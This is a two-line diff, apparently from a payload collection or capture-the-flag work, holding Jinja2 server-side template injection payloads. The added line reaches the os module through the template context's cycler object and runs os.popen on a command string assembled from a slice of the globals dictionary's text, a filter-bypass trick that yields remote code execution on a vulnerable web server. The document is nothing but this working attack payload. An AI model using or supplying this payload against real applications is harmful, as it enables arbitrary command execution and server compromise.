@@ -1,1 +1,2 @@
 {{self.__init__.__globals__.__str__()[1786:1788]}}
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}}
